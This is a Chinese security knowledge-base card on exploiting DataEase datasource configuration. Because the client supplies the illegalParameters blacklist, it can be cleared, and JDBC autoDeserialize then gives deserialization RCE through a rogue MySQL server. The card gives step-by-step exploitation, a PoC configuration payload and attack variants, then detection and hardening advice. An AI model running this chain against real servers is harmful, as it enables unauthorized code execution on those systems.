---
id: web-java-component-dataease-illegalparameters-client-blacklist-jdbc-autodeserialize
title: DataEase 数据源 extraParams 校验：黑名单随请求下发（illegalParameters）导致校验可被清空，配合 autoDeserialize 打通 JDBC 反序列化
type: scenario
domain: web
path: web/java/component
technique: client-supplied-illegalparameter-blacklist-jdbc-autodeserialize
tags:
- java
- dataease
- jdbc
- deserialization
- autodeserialize
- blacklist-bypass
- validator
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W8
  verified_at: '2026-11-09T02:39:22+08:00'
  notes: 已对照原文核对；本次核对未读取图片；原文明确写出后台数据源配置中 extraParams 带 autoDeserialize/detectCustomCollations、提交后提示参数不合法、以及「参数黑名单就在请求包里，直接把黑名单扬了即可绕过waf」，并给出 configuration 全量 JSON（illegalParameters 为 [123]），与卡片 PoC 逐字段一致；后续链子原文只写「直接打 jdbc attack，链子打 jackson 的就行」，卡内已标注为原文所述而非实测。未验证点：服务端具体校验函数实现（for p in illegalParameters ... 的写法）为按现象反推，原文未给 DataEase 源码；DataEase 版本与 CVE 原文均未给出，故未设置 affected_versions
url: /docs/web/java/component/web-java-component-dataease-illegalparameters-client-blacklist-jdbc-autodeserialize/
draft: false
kb_aliases:
- illegalParameters 客户端黑名单
- 数据源额外参数黑名单绕过
- extraParams autoDeserialize
- DataEase 数据源 JDBC 反序列化
- 参数黑名单在请求包里
---

## 一句话结论

后台「新建 MySQL 数据源」表单在提交 `configuration` JSON 时，除了 `extraParams`（JDBC URL 附加参数）还一并发了一个 `illegalParameters` 数组；服务端用它来判断哪些参数属于"非法"，而这个数组**完全由请求体提供**。于是攻击者把 `illegalParameters` 换成无关值 `["123"]`，`extraParams` 里的 `autoDeserialize=true&detectCustomCollations=true` 就不再被拦，服务端按攻击者指定的 MySQL 地址连接，伪服务端回吐序列化 gadget 即完成反序列化 RCE。

## 原理

- **校验输入与被校验输入来自同一个请求**：合法的前端会下发一份"禁止使用的参数名"清单给后端（或后端把清单回显在请求里），后端校验函数形如 `for (p : illegalParameters) if (extraParams.contains(p)) reject(...)`。这种实现把"策略"和"数据"放在同一个不可信输入里，攻击者只要同时改两者，校验恒成立。
- **为什么能走到反序列化**：MySQL Connector/J 的 `autoDeserialize=true` 会在特定时机把服务端返回的字节当作 Java 序列化对象读取（配合 `detectCustomCollations=true` 或 `queryInterceptors=ServerStatusDiffInterceptor` 在握手阶段触发）。所以数据源配置里的这两个参数等价于"允许驱动替我反序列化远端数据"。
- **伪服务端的角色**：目标连的 MySQL 地址（`host`/`port`）同样在 `configuration` 里可控，攻击者跑一个假 MySQL 服务端，握手后把 gadget 字节流当字段值返回，驱动 `readObject` → 触发 gadget → 命令执行。
- **为什么只靠 WAF 字面过滤不够**：挡 `autoDeserialize` 的字面量在参数名/值编码、同义布尔值（`yes`）、参数走私（`user`/`password` 里塞 `&k=v`）等场景下都能绕过；本条更进一步——连校验用的黑名单本身都能被改，任何字面过滤自然失效。
- **落地形态**：本环境里后续链路用的是 Jackson 原生链 gadget（`POJONode`/`getOutputProperties` 一类），只要能返回一条 classpath 里有的可用链即可；由于是无回显环境，实际选择"反序列化里直接命令执行覆盖目标页面文件"而不是维持交互 shell。

## 触发条件

- 攻击者已取得后台会话（本例为弱口令登录；登录后强制改密的流程不影响功能可用）。
- 后台存在数据源/数据库连接配置功能，`configuration` JSON 中的 `extraParams`、`host`、`port`、`username`、`password` 等字段完全由客户端提交。
- 参数合法性校验依赖请求体下发的清单（`illegalParameters` 或类似的"禁止参数"数组/字符串），而不是服务端固定白名单。
- 服务端 classpath 含 MySQL Connector/J，且存在可用于反序列化的 gadget（Jackson、commons-collections 等）。
- 目标可访问攻击者控制的 MySQL 端口（或能在同网段起伪服务端）。

## 利用步骤

1. 登录后台，进入数据源新增 → 选 MySQL，填任意可用测试配置，抓包观察 `configuration` 字段结构（JSON，含 `driver`、`extraParams`、`illegalParameters`、`host`、`port`、`username`、`password`、`dataBase`、连接池参数等）。
2. 先按原样提交一次带 `autoDeserialize=true` 的 `extraParams`，确认服务端返回参数不合法——此时响应里通常能看到它认为"非法"的那个参数名。
3. 把 `illegalParameters` 改成与 JDBC 参数无关的值（如 `["123"]`），其余字段保持，重发；若校验通过，说明黑名单确实来自请求。
4. 把 `extraParams` 设为 `autoDeserialize=true&detectCustomCollations=true`（可重复出现以对抗只处理首次匹配的实现），`host`/`port` 指向自己的伪 MySQL 服务端，`username` 用能触发反序列化的用户名约定。
5. 在伪服务端上按 MySQL 协议应答，握手阶段返回序列化 gadget 字节（本例用 Jackson 原生链，也可换 commons-collections 等）。
6. 由于目标多无出网/无回显，优先选"反序列化即写文件"的 gadget 或命令执行覆盖目标页面，再用浏览器访问被覆盖的页面确认成功（而不是依赖反弹 shell 的稳定性）。
7. 若连接测试接口与保存接口分离，注意改完参数后要触发"测试连接"或访问数据源校验接口，反序列化发生在真正建立连接的那一刻。

## PoC

内层 `configuration`（关键字段，其余按目标版本补齐）：

```json
{
  "driver": "com.mysql.jdbc.Driver",
  "extraParams": "autoReconnect=false&useUnicode=true&characterEncoding=UTF-8&useSSL=false&allowPublicKeyRetrieval=true&autoDeserialize=true&maxAllowedPacket=655360&detectCustomCollations=true&autoDeserialize=true&detectCustomCollations=true",
  "illegalParameters": ["123"],
  "host": "192.168.144.100",
  "port": 3306,
  "username": "root",
  "password": "Password123@mysql",
  "dataBase": "dataease",
  "dataSourceType": "jdbc",
  "customDriver": "default",
  "authMethod": "passwd",
  "initialPoolSize": 5,
  "minPoolSize": 5,
  "maxPoolSize": 50,
  "queryTimeout": 30
}
```

要点说明：

```text
1) illegalParameters 换成与 JDBC 参数无关的值 —— 这一步是绕过本身；
2) autoDeserialize + detectCustomCollations 成对出现，且重复一遍，
   对抗"只匹配第一个同名参数"或"命中一次就停"的简单实现；
3) host/port 指向伪 MySQL 服务端，password 只是占位，真正触发在握手阶段；
4) 提交诱发的响应可能是"连接失败/参数错误"，这不代表没打通 ——
   反序列化在建立连接的过程中已完成，需要用副作用（文件被覆盖）确认。
```

## 变体与关联

- **变体一（黑名单字段换名）**：不同版本该字段可能叫 `illegalParameters`、`denyParams`、`forbiddenParams` 或直接内联在前端 JS 里；判据是"改动它是否能改变服务端判定"，只要成立即可绕过。
- **变体二（不走 autoDeserialize）**：同样由客户端下发的清单还常用来限制 `allowLoadLocalInfile`、`socketFactory`、`queryInterceptors`、`connectionAttributes` 等参数；同一思路可切到读文件、`socketFactory` 加载 Spring XML 等 sink。
- **变体三（同源的字段级绕过）**：若校验改成"按 type 选类再检查该类的字段"，还能用 JSON 覆盖父类 `driver`/`jdbcUrl` 让校验分支与实际执行分支错位（DataEase 的另一条已知路径，见关联卡）。
- **变体四（无回显落地）**：反序列化后不反连，直接在 gadget 里写文件覆盖目标页面/模板；比维持 shell 稳，也不受出网限制。
- **关联**：[[web-java-deserialization-mysql-jdbc-url-autodeserialize-rce]]（`autoDeserialize` 触发反序列化的原理与伪 MySQL 服务端构造）、[[web-java-deserialization-jdbc-url-waf-parser-bypass]]（同一参数被字面/解析差异拦下时的绕过族，本条换的是"校验清单可被改"这一层）、[[web-java-component-dataease-json-driver-override-jdbc-rce]]（同组件的数据源 RCE，但走 type 与 driver 类型错位 + H2 `INIT` 黑名单绕过；本条走 `extraParams` + 客户端下发黑名单）、[[web-java-deserialization-db-connection-test-page-jdbc-url-controlled]]（连接测试类入口的通用打法）。

## 检测与防御

- **根因修复**：参数合法性清单必须硬编码/配置在服务端，绝不接受请求体下发的"允许/禁止参数"；对 `extraParams` 做**白名单**（只允许 `useUnicode`、`characterEncoding`、`useSSL`、`connectTimeout` 这类无副作用项），而不是黑名单。
- **危险参数直接拒绝**：服务端强制 `autoDeserialize=false`、`allowLoadLocalInfile=false`、禁止 `socketFactory`/`queryInterceptors`/`detectCustomCollations` 由客户端设置；这些属性应由服务端统一注入且不可覆盖。
- **数据源治理**：只允许连接服务端白名单内的数据库地址与端口，禁止客户端指定 `host`/`port`（或至少做内网地址黑名单），从根本上断掉伪 MySQL 服务端路径。
- **检测信号**：`configuration` 中同时出现 `autoDeserialize` 与 `detectCustomCollations`；`illegalParameters` 被改成与目标无关的值；数据源配置指向非常规 IP/端口且连接立即失败但进程出现异常类加载；应用进程对外发起 3306 连接。
- **加固**：控制台账号强口令 + 关闭默认口令，避免"弱口令进后台"成为这类后台 RCE 的前置条件；对数据源配置变更做审计留痕与双人复核。
